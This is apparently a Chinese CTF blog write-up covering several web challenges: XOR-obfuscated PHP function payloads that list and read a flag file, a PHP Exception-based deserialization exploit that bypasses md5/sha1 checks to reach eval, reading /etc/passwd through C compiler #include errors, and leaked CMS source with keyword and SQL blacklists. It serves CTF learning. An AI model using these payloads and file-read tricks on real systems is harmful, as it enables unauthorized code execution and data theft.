class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(string)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    out=<span class="string">&quot;(&quot;</span>+out+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;^&quot;</span>+<span class="string">&quot;(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> res2:</span><br><span class="line">        out += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(string)).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    out=out+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;^&quot;</span>+<span class="string">&quot;(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> res3:</span><br><span class="line">        out += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(string)).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    out+=<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"><span class="comment"># print(Replace(xor(&quot;print_r&quot;))+&quot;^(%ff%ff%ff%ff%ff%ff%ff)&quot;)</span></span><br><span class="line"><span class="comment"># print(Replace(xor(&quot;scandir&quot;))+&quot;^(%ff%ff%ff%ff%ff%ff%ff)&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(Replace(xor(<span class="string">&quot;scandir&quot;</span>))+<span class="string">&quot;^(%ff%ff%ff%ff%ff%ff%ff)&quot;</span>)</span><br><span class="line"><span class="comment">#show_source(end(scandir(&quot;.&quot;)))</span></span><br><span class="line"><span class="comment">#show_source=((%8d%a0%97%a0%a0%8d%97%8d%a0%a0%a0)^(%9a%a0%9b%a0%88%9a%9b%9b%a0%a0%a0)^(%9b%97%9c%88%88%9b%9c%9c%8d%9c%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))</span></span><br><span class="line"><span class="comment">#end==((%a0%97%a0)^(%a0%9a%a0)^(%9a%9c%9b)^(%ff%ff%ff))</span></span><br><span class="line">    <span class="comment">#scandir==((%8d%a0%88%97%a0%97%a0)^(%9a%a0%8d%9a%a0%9a%a0)^(%9b%9c%9b%9c%9b%9b%8d)^(%ff%ff%ff%ff%ff%ff%ff))</span></span><br><span class="line"><span class="comment">#.=(%d1^%ff)</span></span><br></pre></td></tr></table></figure>
<p>开头的result和result2是什么呢<br>result2代表一开始没有删减，单纯异或出来的结果中字符串的种类数，很明显是超过了9的，因此我们需要删除，用result中的元素进行两次异或，获得result2中（原始）数据中没有的元素，这样种类数就可以减少<br>print_r(scandir(“.”)):<br><code>?_=((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; index.php [<span class="number">3</span>] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )</span><br></pre></td></tr></table></figure>
<p>发现了flag文件<br>show_source(end(scandir(“.”))):<br><code>?_=((%8d%a0%97%a0%a0%8d%97%8d%a0%a0%a0)^(%9a%a0%9b%a0%88%9a%9b%9b%a0%a0%a0)^(%9b%97%9c%88%88%9b%9c%9c%8d%9c%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%a0)^(%a0%9a%a0)^(%9a%9c%9b)^(%ff%ff%ff))((((%8d%a0%88%97%a0%97%a0)^(%9a%a0%8d%9a%a0%9a%a0)^(%9b%9c%9b%9c%9b%9b%8d)^(%ff%ff%ff%ff%ff%ff%ff))((%d1^%ff)))));</code>	</p>
<p>妈的这题真折磨人啊，真的就是顶级折磨了</p>
<h2 id="harekazectf2019-avatar-uploader"><a href="#harekazectf2019-avatar-uploader" class="headerlink" title="[harekazectf2019]avatar uploader"></a>[harekazectf2019]avatar uploader</h2><p>HnuSec测试题<br>finfo_file和getimazisize函数的区别（打错了）</p>
<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>考点: PHP异常类绕过sha1和md5<br>通过这题调试也发现了之前忽略掉的一些细节</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看似简单的反序列化暗藏玄机，就是sha1和md5不可能同时满足，就算用数组去绕过了也无法eval执行命令，因此在这里又要回到php特性了<br>还记得吗，用内置类去命令执行<code>Error,Exception</code>等等<br>利用他们的toString方法配合eval去命令执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673628817258-f973c518-b6c4-4a70-885c-48f357a2f146.png" alt="image.png"><br>实例化之后message也就是我们的<strong>报错主信息</strong>被赋值为了aaaa，之后输出结果为String：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673628740288-2106a730-ae9d-4f99-ad74-131a7e26dc8d.png" alt="image.png"><br>可以看到其中的aaaa是我们可以控制的内容，将aaaa修改为我们恶意执行代码比如<code>phpinfo()</code>之类的，这样报错信息中就有恶意代码，配合eval就有可能去执行<br>可是还有个问题就是我们可控信息前后都有没用的信息，记得之前扫盲中的eval小技巧吗？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;abc:echo 123;&quot;</span>);  <span class="comment">//123</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;abc12:echo 123;&quot;</span>); <span class="comment">//123</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;12a:echo 123;&quot;</span>); <span class="comment">//报错</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;_12a:echo 123;&quot;</span>);<span class="comment">//123</span></span><br></pre></td></tr></table></figure>
<p>首先是前面有冒号的话，只要<strong>冒号前的字符串是规范的变量名</strong>那么就不会报错<br>其次是假如要注释掉后面的内容只需要加一个<code>?&gt;</code>即可<br>现在反过来看题目，首先要让<code>syc!=lover</code>并且<code>md5(syc)===md5(lover)</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;aaaa&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
<p>我们注册2个异常类，调试看看string中的信息有啥不同：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673629103219-8041d292-993b-4362-9036-693900fa44fe.png" alt="image.png"><br>可以发现有一个行号的问题，要让md5和sha1加密后结果相同，报错的行号位置就应该一样，所以把a、b放到同一行：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673629147904-74c68081-0886-4ab8-b9d7-9befb2951f0e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673629159968-6de154a0-24a8-4b6e-9265-87d172432de8.png" alt="image.png"><br>这次string中的内容就一样了，注意我们<code>$a=new Exception(&quot;aaaa&quot;,1)</code>,我们把code赋值为1，这样绕过了<code>lover!=syc</code><br>因此可以得出答案：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> SYCLOVER;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;include /flag;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;syc=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);<span class="variable">$a</span>-&gt;lover=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于ban掉了括号之类的，难以执行命令，因此就直接猜测根目录是否有flag</p>
<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>考点：c编译器include报错数据带出<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673721474260-0befae57-808e-4786-90a0-e60591b0a8dd.png" alt="image.png"><br>一个会编译你c语言代码的项目（测试过）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673721491035-91f40d32-8946-4e86-95e3-80fc282cf0e4.png" alt="image.png"><br>编译过后返回你这个文件，问题是他又不执行，所以尝试过反弹shell也没用，然后发现头文件include的时候好像有任意文件报错带出：<br><code>#include &quot;/etc/passwd&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673721554323-30335f75-dc67-4754-8e27-d98952f8f323.png" alt="image.png"><br><code>#include &quot;/flag&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673721575027-1d47dd91-e912-46c8-8ba6-707c09a300d3.png" alt="image.png"></p>
<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>考点:cms<br>我败了，我到最后一步居然忘掉了先前的知识，我是傻逼对不起<br>一开始是登录界面，抓包发现验证逻辑：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674202299828-138581c1-5da8-4206-b7e4-5392b1aa660b.png" alt="image.png"><br>尝试过多种方式，看来绕过是不可能了，有login，一定就有register，访问register.php注册个账号然后在登录界面抓包：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674202365328-241d00bb-6324-4303-abc6-a338cd3872af.png" alt="image.png"><br>首先会跳转到admin界面，然后因为权限不够跳转到了guest界面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674202390202-f6167f30-f645-4f31-a0e8-9f307bc5ff45.png" alt="image.png"><br>url中的<code>page</code>参数很可疑，尝试了一波任意文件读取：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674202441096-61f9087f-c081-4068-b7e3-b7a52ef47656.png" alt="image.png"><br>成功读取到了user.php，顺藤摸瓜把几个重要文件都下载了下来：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="string">&quot;<span class="subst">$whitelist</span>&quot;</span>, <span class="variable">$string</span>[<span class="variable">$i</span>]) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">Hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$blacklist</span>/is&quot;</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Hacker</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params"><span class="variable">$sql_query</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_query</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">Filter</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>-&gt;num_rows) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$data</span>[username_which_you_do_not_know];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="variable">$data</span>[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span>(<span class="params"><span class="variable">$level</span>,<span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="subst">$user</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">Filter</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="subst">$user</span>&#x27;,&#x27;<span class="subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
